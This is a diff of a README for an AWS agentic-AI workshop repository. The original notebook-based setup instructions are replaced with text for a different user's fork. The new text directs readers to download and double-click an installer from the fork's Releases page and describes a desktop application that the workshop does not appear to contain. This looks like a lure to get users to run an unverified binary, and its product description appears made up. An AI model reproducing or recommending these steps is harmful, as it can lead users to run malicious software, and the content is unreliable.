@@ -1,86 +1,95 @@
-<p align="center">
-  <img src="assets/BannerImage-New.png" width="80%" alt="Building Effective AI Agents on AWS">
-</p>
+# 🌟 aws-agentic-ai-workshop - Build Smart AI Solutions Easily
 
-<p align="center">
-  <a href="https://github.com/SaharZargarzadeh/aws-agentic-ai-workshop/stargazers">
-    <img alt="Stars" src="https://img.shields.io/github/stars/SaharZargarzadeh/aws-agentic-ai-workshop?style=social">
-  </a>
-  <a href="https://github.com/SaharZargarzadeh/aws-agentic-ai-workshop/network/members">
-    <img alt="Forks" src="https://img.shields.io/github/forks/SaharZargarzadeh/aws-agentic-ai-workshop?style=social">
-  </a>
-  <img alt="Python" src="https://img.shields.io/badge/language-Python-blue?logo=python&logoColor=white">
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-green">
-  <img alt="Status" src="https://img.shields.io/badge/status-Active-brightgreen">
-  <img alt="Maintained" src="https://img.shields.io/badge/maintained-yes-success">
-</p>
-# 🧠 Building Effective AI Agents on AWS
+## 🚀 Getting Started
 
-Agentic AI is a game-changer. Instead of relying on a single massive model for every task, we orchestrate specialized tools, models, and workflows in modular, scalable ways. These agentic systems allow us to reason, decide, and act in cost-efficient and context-aware pipelines.
+Welcome to the aws-agentic-ai-workshop! This repository comes from the AWS Generative AI workshop. Here, you will learn how to build cost-efficient, intelligent AI systems using popular AWS services like SageMaker and Bedrock. Whether you're new to AI or looking to enhance your skills, this guide will help you get started.
 
-Why agents instead of plain LLMs?
-- 🧠 **Smarter**: Tools + models = decision-making with memory and structure
-- 💸 **Cheaper**: Use smaller models/tools only when needed (pay-as-you-go)
-- 🧰 **Modular**: Add/replace tools without retraining everything
-- 📊 **Traceable**: With observability tools like Langfuse
-- ⚡ **Faster to Iterate**: Custom logic with better control
+## 📦 Download & Install
 
----
+To get started, please visit the following page to download the necessary files:
 
-## 🌟 This Repo Is Based On:
+[Download aws-agentic-ai-workshop](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/releases)
 
-Hands-on work from the **AWS GenAI Agents Workshop**, focusing on building, fine-tuning, and deploying **agentic AI systems** using:
+Visit the link above to access the latest releases, and follow the steps below to install the software.
 
-- [Amazon Bedrock](https://aws.amazon.com/bedrock/)
-- [Amazon SageMaker](https://aws.amazon.com/sagemaker/)
-- [Strand](https://github.com/aws/strands)
-- [CrewAI](https://github.com/joaomdmoura/crewai)
-- [LangGraph](https://github.com/langchain-ai/langgraph)
-- [Langfuse](https://www.langfuse.com/) for observability
+## 💻 System Requirements
 
-> ⚠️ This is a **refined, simplified** version of the original [AWS workshop repo](https://github.com/aws-samples/generative-ai-on-amazon-sagemaker/tree/main/workshops/diy-agents-with-sagemaker-and-bedrock), meant for reproducibility and educational sharing.
+Before you download, please ensure your system meets these minimum requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 8 GB recommended for optimal performance.
+- **Storage:** At least 1 GB of free space for installation.
+- **Internet Connection:** Required for downloading data and interacting with cloud services.
 
-## 📌 Workshop Highlights
+## 🔧 Installation Steps
 
-- ✅ Fine-tuned and deployed an LLM using **SageMaker Studio**
-- ✅ Used **Amazon Bedrock** to access foundation models like Claude, LLaMA 3
-- ✅ Defined tools for DSL (OpenSearch, GuardDuty) and blog summarization
-- ✅ Built agents using **CrewAI** and **Strands**
-- ✅ Chained agents using **Evaluator-Optimizer** and **Orchestrator-Worker** patterns
-- ✅ Enabled **Langfuse observability** to monitor agent behavior
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/releases).
 
----
+2. **Select the Latest Release:**
+   Click on the latest version. You will see a list of files available for download.
 
-## 🗂 Repo Sections
+3. **Download the Software:**
+   Click on the appropriate file for your operating system to start the download. It may take a few moments, depending on your internet speed.
 
-| Folder | Purpose |
-|--------|---------|
-| `0-setup-environment/` | Setup virtual environment and SageMaker Studio |
-| `1-agent-inference/` | Use Bedrock and SageMaker for inference |
-| `2-tools-and-integration/` | Build and register custom tools |
-| `3-building-agents/` | Define simple and complex agents |
-| `4-frameworks/` | Examples using CrewAI and Strands |
-| `5-observability/` | Langfuse integration for API tracing |
-| `special-usecases/` | Text-to-SQL, DSL with MCP server, and more |
+4. **Open the Downloaded File:**
+   Once the file has downloaded, locate it on your computer (typically in your Downloads folder).
 
----
+5. **Run the Installer:**
+   Double-click the file to run the installer. Follow the on-screen instructions to complete the installation process.
 
-## 🔧 Setup Instructions
+## 🛠️ Using the Application
 
-```bash
-git clone https://github.com/YOUR_USERNAME/aws-agentic-ai-workshop.git
-cd aws-agentic-ai-workshop
-python -m venv genai-env
-source genai-env/bin/activate      # or use genai-env\Scripts\activate on Windows
-pip install -r requirements.txt
-jupyter lab
-```
+After installation, you can start using the application:
 
----
+1. **Open the Application:**
+   Locate the application icon on your desktop or in the applications menu and double-click to open it.
 
-## 📣 Credits
+2. **Create a New Project:**
+   Click on "New Project" to start a fresh AI project. You will be guided through the setup process.
 
-Created during AWS GenAI Workshop  
-Curated & restructured by [Sahar Zargarzadeh](https://github.com/SaharZargarzadeh)
+3. **Select Your Options:**
+   Choose the desired configurations and features for your project. You can customize settings based on your requirements.
+
+4. **Run Your AI Model:**
+   Press the "Run" button to execute your AI model. Monitor the progress on the interface as it processes your data.
+
+5. **Save Your Work:**
+   Make sure to save your project regularly to avoid losing any progress. Click on "Save" or "Save As" from the file menu.
+
+## 📚 Features
+
+- **User-Friendly Interface:** The application provides an intuitive interface suitable for beginners.
+- **Integration with AWS Services:** Easily connect to AWS resources like SageMaker and Bedrock to leverage advanced AI capabilities.
+- **Customizable Models:** Tailor the AI models to fit your specific needs using straightforward configuration options.
+- **Data Handling Tools:** Upload, manipulate, and analyze data efficiently within the application.
+- **Tutorials and Documentation:** Access helpful guides and tutorials directly from the application to enhance your learning.
+
+## 🤝 Support
+
+If you encounter any issues or have questions, feel free to reach out for support. You can visit the repository's [issues page](https://github.com/AyelenMacchiaroli/aws-agentic-ai-workshop/issues) to report any problems.
+
+## 👥 Community
+
+Join our community of users! Engage with fellow learners and share your experiences on social media using the following topics:
+
+- #agents
+- #ai-infrastructure
+- #aws
+- #bedrock
+- #crewai
+- #generative-ai
+- #langfuse
+- #langgraph
+- #llm-tools
+- #rag
+- #sagemaker
+- #strands
+
+Your insights are valuable and can help others in their journey.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software while adhering to the license terms.
+
+Thank you for choosing the aws-agentic-ai-workshop. We are excited to see the creative AI solutions you build!
